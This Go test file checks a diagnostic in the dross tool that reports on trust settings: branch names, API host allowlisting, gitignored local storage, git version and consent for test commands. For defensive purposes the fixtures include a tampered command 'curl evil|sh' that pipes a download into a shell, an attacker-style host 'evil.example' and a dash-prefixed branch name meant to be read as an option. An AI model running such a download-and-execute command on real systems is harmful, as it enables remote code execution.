package diag

import (
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/Rivil/dross/internal/consent"
	"github.com/Rivil/dross/internal/project"
)

// memStore is an in-memory consent.Store.
type memStore struct{ g consent.Grants }

func (m *memStore) Load() (*consent.Grants, error) { g := m.g; return &g, nil }
func (m *memStore) Save(g *consent.Grants) error   { m.g = *g; return nil }

// trustFixture is a repo dir (NOT a git work tree, so the tracked-store
// refusal never fires) with a .gitignore that ignores the store, plus the
// inputs every ConfigTrust call needs. Callers tweak what they test.
func trustFixture(t *testing.T) (root, repoDir string, in TrustInputs) {
	t.Helper()
	repoDir = t.TempDir()
	root = filepath.Join(repoDir, ".dross")
	if err := os.MkdirAll(root, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(repoDir, ".gitignore"), []byte(".dross/local.toml\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	in = TrustInputs{
		GitVersion:      func() (string, error) { return "git version 2.45.0\n", nil },
		Grants:          &memStore{},
		IgnoresPath:     func(body, target string) bool { return strings.Contains(body, target) },
		LocalIgnorePath: ".dross/local.toml",
		ValidateRef: func(kind, name string) error {
			if strings.HasPrefix(name, "-") {
				return errors.New(kind + " = " + name + ": git reads a leading dash as an option")
			}
			return nil
		},
		GatedCommands: []string{"test", "verify"},
	}
	return root, repoDir, in
}

func section(t *testing.T, sections []Section, heading string) Section {
	t.Helper()
	for _, s := range sections {
		if s.Heading == heading {
			return s
		}
	}
	t.Fatalf("no %q section in %+v", heading, sections)
	return Section{}
}

func joined(lines []Line) string {
	var sb strings.Builder
	for _, l := range lines {
		sb.WriteString(l.Text + "\n")
	}
	return sb.String()
}

// TestConfigTrustCleanRepoIsAllOK: a well-formed repo yields the five
// sections in order, every one OK, zero issues, and prints nothing.
func TestConfigTrustCleanRepoIsAllOK(t *testing.T) {
	root, repoDir, in := trustFixture(t)
	p := &project.Project{}
	p.Repo.GitMainBranch = "main"
	p.Runtime.TestCommand = "go test ./..."
	if err := consent.GrantConsent(in.Grants, p.Runtime.TestCommand); err != nil {
		t.Fatal(err)
	}
	var sections []Section
	var issues int
	silent(t, func() { sections, issues = ConfigTrust(root, repoDir, p, in) })
	if issues != 0 {
		t.Errorf("issues = %d on a clean repo:\n%+v", issues, sections)
	}
	want := []string{"Branch names:", "API host:", "Machine-local store:", "git version:", "Exec consent:"}
	for i, h := range want {
		if i >= len(sections) || sections[i].Heading != h {
			t.Fatalf("section %d = %q, want %q", i, sections[i].Heading, h)
		}
		if sections[i].Lines[0].Level != OK {
			t.Errorf("%s first line = %+v, want OK", h, sections[i].Lines[0])
		}
	}
	ec := section(t, sections, "Exec consent:")
	if !strings.Contains(joined(ec.Lines), "Authorizes the dross commands that spawn a process: test, verify.") {
		t.Errorf("gated roster missing:\n%s", joined(ec.Lines))
	}
	if !strings.Contains(joined(section(t, sections, "git version:").Lines), "git version 2.45.0 supports --end-of-options") {
		t.Errorf("git version line = %+v", section(t, sections, "git version:").Lines)
	}
}

// TestConfigTrustExecConsentLadder: stale is an Issue naming CHANGED, absent
// is a Warn ("has not trusted"), and lanes-only-no-test-command takes the
// lane-aware wording.
func TestConfigTrustExecConsentLadder(t *testing.T) {
	t.Run("stale", func(t *testing.T) {
		root, repoDir, in := trustFixture(t)
		p := &project.Project{}
		p.Runtime.TestCommand = "go test ./..."
		if err := consent.GrantConsent(in.Grants, "go test ./... && curl evil|sh"); err != nil {
			t.Fatal(err)
		}
		sections, issues := ConfigTrust(root, repoDir, p, in)
		ec := section(t, sections, "Exec consent:")
		if issues != 1 || CountIssues(ec.Lines) != 1 || ec.Lines[0].Level != Issue || !strings.Contains(ec.Lines[0].Text, "CHANGED") {
			t.Errorf("stale: issues=%d lines=%+v", issues, ec.Lines)
		}
		if ec.Lines[1].Level != Note || ec.Lines[1].Text != "      go test ./..." {
			t.Errorf("the changed command is not quoted verbatim under the finding: %+v", ec.Lines[1])
		}
	})
	t.Run("absent", func(t *testing.T) {
		root, repoDir, in := trustFixture(t)
		p := &project.Project{}
		p.Runtime.TestCommand = "go test ./..."
		sections, issues := ConfigTrust(root, repoDir, p, in)
		ec := section(t, sections, "Exec consent:")
		if issues != 0 || ec.Lines[0].Level != Warn || !strings.Contains(ec.Lines[0].Text, "has not trusted") {
			t.Errorf("absent: issues=%d lines=%+v", issues, ec.Lines)
		}
	})
	t.Run("lanes declared and no test command", func(t *testing.T) {
		root, repoDir, in := trustFixture(t)
		p := &project.Project{}
		p.Runtime.TestLane = []project.TestLane{{Name: "go", Command: "go test ./..."}}
		sections, issues := ConfigTrust(root, repoDir, p, in)
		ec := section(t, sections, "Exec consent:")
		if issues != 0 || ec.Lines[0].Level != Warn || !strings.Contains(ec.Lines[0].Text, "`dross test --files` still runs the lanes") {
			t.Errorf("lanes-only: issues=%d lines=%+v", issues, ec.Lines)
		}
	})
	t.Run("no lanes and no test command", func(t *testing.T) {
		root, repoDir, in := trustFixture(t)
		sections, _ := ConfigTrust(root, repoDir, &project.Project{}, in)
		ec := section(t, sections, "Exec consent:")
		if ec.Lines[0].Level != Warn || !strings.Contains(ec.Lines[0].Text, "so the loop commands refuse") {
			t.Errorf("no-command: %+v", ec.Lines)
		}
	})
}

// TestConfigTrustHostOutsideAllowlist: an api_base off the derived allowlist
// is an Issue followed by the Note naming the escape hatch; an allowlist
// refusal is an Issue of its own and suppresses the OK line.
func TestConfigTrustHostOutsideAllowlist(t *testing.T) {
	root, repoDir, in := trustFixture(t)
	p := &project.Project{}
	p.Remote.URL = "https://github.com/Rivil/dross"
	p.Remote.APIBase = "https://evil.example/api/v1"
	sections, issues := ConfigTrust(root, repoDir, p, in)
	api := section(t, sections, "API host:")
	if issues != 1 || len(api.Lines) != 2 || api.Lines[0].Level != Issue {
		t.Fatalf("off-allowlist host: issues=%d lines=%+v", issues, api.Lines)
	}
	if api.Lines[1] != (Line{Note, "    Fix (only if you trust this host): `dross local set allow_hosts evil.example`"}) {
		t.Errorf("fix line = %+v", api.Lines[1])
	}

	in.AllowHostsErr = errors.New("refusing to read .dross/local.toml: git reports it tracked")
	p.Remote.APIBase = ""
	sections, issues = ConfigTrust(root, repoDir, p, in)
	api = section(t, sections, "API host:")
	if issues != 1 || len(api.Lines) != 1 || api.Lines[0].Level != Issue || !strings.Contains(api.Lines[0].Text, "tracked") {
		t.Errorf("allowlist refusal: issues=%d lines=%+v", issues, api.Lines)
	}
}

// TestConfigTrustBranchStoreAndGit: a dashed branch is an Issue with the Fix
// note; a store not gitignored is an Issue; an old git is an Issue and an
// unreadable git version a Warn.
func TestConfigTrustBranchStoreAndGit(t *testing.T) {
	root, repoDir, in := trustFixture(t)
	p := &project.Project{}
	p.Repo.GitMainBranch = "-evil"
	p.Repo.BranchPattern = "phase/<id>"
	if err := os.WriteFile(filepath.Join(repoDir, ".gitignore"), []byte("node_modules\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	in.GitVersion = func() (string, error) { return "git version 2.23.0", nil }
	sections, issues := ConfigTrust(root, repoDir, p, in)
	if issues != 3 {
		t.Errorf("issues = %d, want 3 (branch, store, git):\n%+v", issues, sections)
	}
	br := section(t, sections, "Branch names:")
	if br.Lines[0].Level != Issue || !strings.Contains(br.Lines[0].Text, "leading dash") || !strings.Contains(br.Lines[1].Text, "dross project set repo.git_main_branch <name>") {
		t.Errorf("branch lines = %+v", br.Lines)
	}
	st := section(t, sections, "Machine-local store:")
	if st.Lines[0].Level != Issue || !strings.Contains(st.Lines[0].Text, "is not gitignored") || !strings.Contains(st.Lines[1].Text, "git rm --cached .dross/local.toml") {
		t.Errorf("store lines = %+v", st.Lines)
	}
	gv := section(t, sections, "git version:")
	if gv.Lines[0].Level != Issue || !strings.Contains(gv.Lines[0].Text, "is older than git 2.24") {
		t.Errorf("git lines = %+v", gv.Lines)
	}

	in.GitVersion = func() (string, error) { return "", errors.New("exec: git not found") }
	sections, _ = ConfigTrust(root, repoDir, &project.Project{}, in)
	gv = section(t, sections, "git version:")
	if gv.Lines[0].Level != Warn || !strings.Contains(gv.Lines[0].Text, "couldn't read `git --version`") {
		t.Errorf("unreadable git = %+v", gv.Lines)
	}
}

// TestLaneConsentLevels: a mismatched fingerprint is an Issue naming the lane
// and `dross trust --lane <name>`, no grant is a Warn, a granted lane is OK,
// a prepared lane's rows include the prepare line, and a commandless lane is
// a Warn pointing at validate.
func TestLaneConsentLevels(t *testing.T) {
	root, repoDir, in := trustFixture(t)
	p := &project.Project{}
	p.Runtime.TestLane = []project.TestLane{
		{Name: "a", Command: "go test ./a"},
		{Name: "b", Command: "go test ./b", Prepare: "make build"},
		{Name: "c", Command: "go test ./c"},
		{Name: "broken"},
	}
	if err := consent.GrantLaneConsent(in.Grants, "a", consent.LaneLine(p.Runtime.TestLane[0])); err != nil {
		t.Fatal(err)
	}
	if err := consent.GrantLaneConsent(in.Grants, "b", consent.Fingerprint("something else")); err != nil {
		t.Fatal(err)
	}
	var lines []Line
	var issues int
	silent(t, func() { lines, issues = LaneConsent(root, repoDir, p, in.Grants) })
	if issues != 1 {
		t.Errorf("issues = %d, want 1 (lane b stale):\n%s", issues, joined(lines))
	}
	if lines[0] != (Line{OK, `lane "a": trusted`}) {
		t.Errorf("granted lane = %+v", lines[0])
	}
	text := joined(lines)
	for _, want := range []string{
		`lane "b": consent is stale`, "      go test ./b", "      prepare: make build", "dross trust --lane b",
		`lane "c": not trusted on this machine:`, "dross trust --lane c",
		`lane "broken" declares no command`, "dross validate",
	} {
		if !strings.Contains(text, want) {
			t.Errorf("lane report lacks %q:\n%s", want, text)
		}
	}
	// The stale lane's row is Issue; the absent and commandless rows are Warn.
	var levels []Level
	for _, l := range lines {
		if l.Level != Note {
			levels = append(levels, l.Level)
		}
	}
	if want := []Level{OK, Issue, Warn, Warn}; len(levels) != 4 || levels[0] != want[0] || levels[1] != want[1] || levels[2] != want[2] || levels[3] != want[3] {
		t.Errorf("non-note levels = %v, want %v", levels, want)
	}
	if got, _ := LaneConsent(root, repoDir, &project.Project{}, in.Grants); got != nil {
		t.Errorf("a repo with no lanes rendered %+v", got)
	}
}

// TestHostOf pins the host[:port] extraction the fix line relies on.
func TestHostOf(t *testing.T) {
	for raw, want := range map[string]string{
		"https://evil.example/api/v1": "evil.example",
		"https://git.corp:8443/api":   "git.corp:8443",
		"  https://x.example  ":       "x.example",
		"not a url":                   "",
		"":                            "",
		"https://[::1]:9/api":         "::1:9",
	} {
		if got := hostOf(raw); got != want {
			t.Errorf("hostOf(%q) = %q, want %q", raw, got, want)
		}
	}
}
